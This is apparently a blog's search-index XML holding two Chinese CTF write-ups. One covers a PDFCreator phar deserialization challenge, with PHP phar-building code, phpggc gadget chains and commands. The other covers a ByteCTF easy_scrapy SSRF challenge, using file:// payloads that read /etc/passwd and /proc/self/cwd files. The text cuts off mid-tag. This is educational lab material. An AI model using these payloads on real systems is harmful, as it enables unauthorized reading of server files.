<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PDFCreator题解</title>
    <link href="/2020/10/31/20201031-PDFCreator%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/10/31/20201031-PDFCreator%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>该题为 phar 反序列化，上传文件要求为图片。感觉 phpggc 工具挺香的，决定分享一下。</p><p>比赛地址：<a href="https://ctftime.org/event/854/tasks/">Chaos Communication Camp 2019 </a><br>题解1:<a href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">[Web] Chaos Communication Camp 2019 CTF - pdfcreator</a><br>题解2:<a href="https://medium.com/@craig.knott92/ccc-2019-ctf-pdfcreator-9c76fd60452d">CCC 2019 CTF — PDFCreator</a></p><hr><a id="more"></a><p>（ps：为啥突然做这题？某个大佬丢给我的，顺手就蹭了个环境，毕竟搭建环境挺麻烦的，补题都来不及</p><p>首先体验一下网站，上传需要图片小于 500KB，从网上找了一张图片 5k。上传后返回结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 顶部显示：Upload successful: upload/fd456406745d816a45cae554c788e754.jpg</span><br><br>&lt;h1&gt;Converted by CoolPDF&lt;/h1&gt;&lt;h3&gt;We hope you enjoyed our service!&lt;/h3&gt;<br>     &lt;img src=<span class="hljs-string">&quot;upload/fd456406745d816a45cae554c788e754.jpg&quot;</span>&gt;<br>      <br></code></pre></td></tr></table></figure><p>然后再次提交，返回结果为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># TCPDF ERROR: Unable to create output file: /var/www/html/output/81f851fd84a2591f4608f9a7715095ad.pdf</span><br></code></pre></td></tr></table></figure><p>起初对 phar 不太熟悉，只有大致的了解。开始测试使用题解 1 的 payload，并未修改任何东西，payload 打上去没有任何结果。(实际上应该是有结果的，在 html 源码里，不会直接呈现在页面)<br>界面<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235650.png"><br>源码<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235615.png"></p><p>知道真相，(-.-)# 直接气哭。以后记得多看源码！多看源码！多看源码！</p><hr><h1 id="方法1-手写phar"><a href="#方法1-手写phar" class="headerlink" title="方法1:手写phar"></a>方法1:手写phar</h1><p>首先创建 phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;creator.php&quot;</span>;<br>$jpeg_header_size =<br><span class="hljs-string">&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;</span>.<br><span class="hljs-string">&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;</span>.<br><span class="hljs-string">&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;</span>.<br><span class="hljs-string">&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;</span>.<br><span class="hljs-string">&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;</span>.<br><span class="hljs-string">&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;</span>.<br><span class="hljs-string">&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;</span>.<br><span class="hljs-string">&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;</span>.<br><span class="hljs-string">&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;</span>.<br><span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;</span>.<br><span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;</span>.<br><span class="hljs-string">&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;</span>;<br>$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>$phar-&gt;startBuffering();<br>$phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br>$phar-&gt;setStub($jpeg_header_size.<span class="hljs-string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);<br>$o = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>$o-&gt;tmpfile = <span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br>$phar-&gt;setMetadata($o);<br>$phar-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>然后执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">php phar.php<br>mv phar.phar phar.jpeg<br></code></pre></td></tr></table></figure><p>将文件上传，并添加 phar 包装器，类似下面的格式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Converted by CoolPDF<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>We hope you enjoyed our service!<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;phar://upload/708697c63f7eb369319c6523380bdf7a_11.jpg&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最后可以得到结果（使用 /etc/passwd 容易回显，以后本地文件包含的时候尽量用这个文件吧）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/03C73EAE-9B6D-4097-86BF-675DAD58D598.png"></p><p>接着开始读/etc/apache2/sites-enabled/000-default.conf（修改上方高亮出），可以从这个文件中判断文件路径。在执行第一行命令的时候可能会报错(一堆输出)，可以不用理会。最终得到web的根路径为 /var/www/html。设置$o-&gt;tmpfile = “ /var/www/html/flag.php”，使用 F12 查看源码即可得到 flag。</p><blockquote><p>$flag = “flag{7f5c676fb4a062752124bcaf69a01701}”;</p></blockquote><hr><h1 id="方法2-使用-PHPGGC-来实现-LFI（Local-File-Include）"><a href="#方法2-使用-PHPGGC-来实现-LFI（Local-File-Include）" class="headerlink" title="方法2: 使用 PHPGGC 来实现 LFI（Local File Include）"></a>方法2: 使用 PHPGGC 来实现 LFI（Local File Include）</h1><p>下载并且初始化 phpggc（复制模版）。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ambionics/</span>phpggc<br>$ cd phpggc<br>$ mkdir gadgetchains<span class="hljs-regexp">/Alles/</span> &amp;&amp; mkdir gadgetchains<span class="hljs-regexp">/Alles/</span>FR &amp;&amp; mkdir gadgetchains<span class="hljs-regexp">/Alles/</span>FR/<span class="hljs-number">1</span> <br>$ cp templates<span class="hljs-regexp">/* gadgetchains/</span>Alles<span class="hljs-regexp">/FR/</span><span class="hljs-number">1</span>/*<br></code></pre></td></tr></table></figure><p>修改 gadgetchains/Alles/FR/1/ 下的 chain.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PDFStuff</span> &#123;<br>  <span class="hljs-title">class</span> <span class="hljs-title">PDFCreator</span> &#123; <span class="hljs-title">public</span> $<span class="hljs-title">tmpfile</span>; &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Alles</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">FR1</span> <span class="hljs-title">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">FileRead</span> &#123;<br>        public static $version = &#x27;1.00&#x27;;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;__destruct&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;teamrocketist&#x27;</span>;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>) </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>            $a-&gt;tmpfile = $parameters[<span class="hljs-string">&quot;remote_file&quot;</span>]; <span class="hljs-comment">// file to read</span><br>            <span class="hljs-keyword">return</span> $a;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>生成 phar 的图片，使用 /etc/passwd 更容易回显结果（有的 php 源码在浏览器中需要查看源码才能看到，比如 flag.php）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc Alles/FR1 /etc/passwd -f -pj ../dummy.jpg -o ../exploit.jpg<br><br></code></pre></td></tr></table></figure><p>然后和上面的步骤一样，上传就可以读取文件。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/254F244D-5867-46BA-9C85-A952E884343C.png"></p><hr><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>在题解中，发现一个非常强大的工具——PHPGGC</p><p>PHPGGC 是一款能够自动生成主流框架的序列化测试 payload 的工具,可以说是反序列化的武器库,平时遇到有关反序列化的题目时如果能够熟练运用它，将节省大量功夫。</p><p>可以创建自己的模块，使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/ambionics/phpggc</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> phpggc</span><br><span class="hljs-meta">$</span><span class="bash"> mkdir gadgetchains/Alles/ &amp;&amp; mkdir gadgetchains/Alles/FR &amp;&amp; mkdir gadgetchains/Alles/FR/1</span><br><span class="hljs-meta">$</span><span class="bash"> cp templates/* gadgetchains/Alles/FR/1/*</span><br></code></pre></td></tr></table></figure><p>默认的模版 chain.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\&#123;<span class="hljs-title">NAME</span>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;CLASS_NAME&#125; <span class="hljs-keyword">extends</span> \&#123;BASE_CLASS_NAME&#125;<br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $version = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>)</span><br><span class="hljs-function">    </span>&#123;<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>参考文章中的模块 chain.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PDFStuff</span> &#123;<br>  <span class="hljs-title">class</span> <span class="hljs-title">PDFCreator</span> &#123; <span class="hljs-title">public</span> $<span class="hljs-title">tmpfile</span>; &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Alles</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">FR1</span> <span class="hljs-title">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">FileRead</span> &#123;<br>        public static $version = &#x27;1.00&#x27;;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;__destruct&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;teamrocketist&#x27;</span>;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>) </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>            $a-&gt;tmpfile = $parameters[<span class="hljs-string">&quot;remote_file&quot;</span>]; <span class="hljs-comment">// file to read</span><br>            <span class="hljs-keyword">return</span> $a;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其中 version、vector、author 在查看当前模块信息的时候会显示，如下图所示。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1B804691-FA75-4CAF-9B5C-4305E7974FF1.png"></p><p>构建phar的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg<br></code></pre></td></tr></table></figure><p>参数「-f」使用 fast-destruct 的方法，确保对象在反序列化的时候，能被摧毁。参数「-pj」创建 jpeg 格式的 phar，dummy.jpg 是一张普通图片。参数「-o」明确说明 payload 的输出地址。flag.php 是模块需要的参数，需要读取的远程文件的地址</p><hr><h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><p>在搜索到 TCPDF 的 cve，漏洞是由于 phar 类型的 php 反序列化导致的。故寻找 TCPDF 的利用点。这个地方需要使用到大型代码审计的技巧，通常可以按照如下所示的几个步骤来进行审计。</p><ol><li>找到危险函数；此处的危险函数一定在 反序列化所使用到的类，一定在类里的魔术方法里。</li><li>向上回溯寻找有无可用输入点；寻找可控输入点。</li><li>尝试绕过针对输入点的过滤；</li><li>寻找触发漏洞的方法。</li></ol><p>而这个地方我们已经找到了漏洞，就需要先理清代码的基本逻辑思路。（关键点肯定在「类」中，毕竟这个题的考点是反序列化），可以考虑直接审计反序列化代码，再回溯利用点。</p><p>先在 creator.php 中找到魔术方法，并寻找危险函数（由于 this-&gt;tmpfile 在反序列时可控），故需要进行反序列化然后本地文件包含，tmpfile 设置为我们需要的函数。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/A5780B58-D39F-4E52-809F-EA15216A4BB0.png"></p><p>编写生成 phar 代码</p><ul><li>方法1: phpggc 工具<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D31F2612-132F-48E3-BBA0-8B99AA623F93.png"></li><li>方法2:手动编写<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1E138875-D810-430B-ABD0-9F4594E2C11D.png"></li></ul><p>最后需要使用包装器执行代码，如下图所示：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201101001720.png"></p><p>参考教程：</p><ol><li><a href="https://xz.aliyun.com/t/6699#toc-2">php反序列化拓展攻击详解–phar</a></li><li><a href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">Chaos Communication Camp 2019 CTF - pdfcreator</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
      <tag>phar</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020年10月ByteCTF部分web题解</title>
    <link href="/2020/10/25/20201025-ByteCTF%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/10/25/20201025-ByteCTF%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>题解和题目地址：<a href="https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md">https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md</a><br>官方题解：<a href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D</a></p><hr><a id="more"></a><p>用于爆破 md5 的脚本（验证码）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># crack.py</span><br><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    c = input()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">9999999999</span>):<br>        <span class="hljs-keyword">if</span> md5(str(i)).startswith(c):<br>            print(i)<br>            print(<span class="hljs-string">&#x27;----------------&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><hr><h1 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h1><ul><li>题目地址：<a href="http://101.200.50.18:30010/">http://101.200.50.18:30010/</a></li><li>官方题解：<a href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC</a></li><li>oxcccccc：<a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></li><li>N0rth3题解：<a href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</a></li><li>ByteCTF2020-easyscrapy：<a href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></li><li>ByteCTF2020—w4nder：<a href="http://phoebe233.cn/?p=328#easyscrapy">http://phoebe233.cn/?p=328#easyscrapy</a></li></ul><p>经过测试，该网站会爬取提交的链接以及链接中的外链，并且提交链接的类型只能是 HTTPS。我当时只在提交链接的部分测试了SSRF，以后在做题时，需要边做边写题解，这样会让自己的思路更加的清晰和正确。</p><p>在 服务器编写 1.html ，然后提交 url 即可得到 /etc/passwd 文件，成功本地文件包含，返回结果如下。</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sml"><br>b&#x27;&lt;a href=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;\n&#x27;<br><br></code></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png"></p><p>考虑去读取爬虫的源码，但是并不知道路径，尝试 proc 目录。GET 新姿势，在服务器源码中写入下面的代码并提交。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cmdline&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>proc/self/cmdline 中 /proc/self  是指向当前进程的内存，/proc/self/cmdline 启动进程时执行的命令。类似的接口还有：</p><ul><li>/proc/$PID/environ 该文件保存进程的环境变量</li><li>/proc/$PID/cwd 一个符号连接, 指向进程当前的工作目录</li><li>/proc/$PID/exe 一个符号连接, 指向被执行的二进制代码</li><li>/proc/$PID/fd 进程所打开的每个文件都有一个符号连接在该子目录里, 以文件描述符命名, 这个名字实际上是指向真正的文件的符号连接</li><li>/proc/$PID/attr 进程的属性<br>tip: 当找不到网站路径的时候，可以利用 /proc/self/cwd 目录来读取文件路径</li></ul><p>当提交请求后的返回结果为：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>b<span class="hljs-string">&#x27;/usr/local/bin/python\x00/usr/local/bin/scrapy\x00crawl\x00byte\x00&#x27;</span><br># 解码后：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>python <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>scrapy crawl <span class="hljs-keyword">byte</span><br><br></code></pre></td></tr></table></figure><p>b’ 是 Python 的 bytes 类型，表明这个变量在存储的时候是 bytes 类型（二进制形式）。上面的命令可以被化简为 python scrapy crawl byte，这是 scrapy 的启动命令。爬虫的名称叫做 byte，在 spiders 目录中有用。</p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>我们可以参考 <a href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/topics/commands.html#scrapy">scrapy 的文档</a>，我们可以知道 scrapy 的目录结构（贯穿全文）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>scrapy.cfg<br>myproject/（项目名称，未知）<br>    __init__.py<br>    items.py<br>    pipelines.py<br>    settings.py<br>    spiders/<br>        __init__.py<br>        spider1.py<br>        spider2.py<br>        ...<br><br></code></pre></td></tr></table></figure><p>目录结构 +  /proc/self/cwd 来进行文件读取。首先尝试读取 scrapy.cfg 文件（另外的数据需要使用项目名称）。构造 SSRF 的 url 如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/scrapy.cfg&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>其中 /proc/self/cwd/ 指向工作路径（current work directory 简称 cwd），读取工作路径下的 scrapy.cfg 文件。再次提交 url，返回结果如下：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex"># scrapy.cfg<br><br>b&#x27;# Automatically created by: scrapy startproject<span class="hljs-tag">\<span class="hljs-name">n</span></span>#<span class="hljs-tag">\<span class="hljs-name">n</span></span># For more information about the [deploy] section see:<span class="hljs-tag">\<span class="hljs-name">n</span></span># https://scrapyd.readthedocs.io/en/latest/deploy.html<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">n</span><span class="hljs-string">[settings]</span></span><span class="hljs-tag">\<span class="hljs-name">ndefault</span> = </span>bytectf.settings<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">n</span><span class="hljs-string">[deploy]</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>#url = http://localhost:6800/<span class="hljs-tag">\<span class="hljs-name">nproject</span> = </span>bytectf<span class="hljs-tag">\<span class="hljs-name">n</span></span>&#x27;<br><br></code></pre></td></tr></table></figure><p>这种格式的文本不便于进行阅读，Python 的 Bytes 直接输出就会呈现这种效果，使用 vscode 的替换功能将 \n 转换成“换行”。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/472EE1BB-6765-4B4D-B9F0-341E25B7D163.png"><br>修改为“正则模式”进行替换，将 “\n” 替换成 “\n”。通过上面的文本，我们就能够读取所有的文件了。</p><p>尝试读取 setting 文件。</p><figure class="highlight 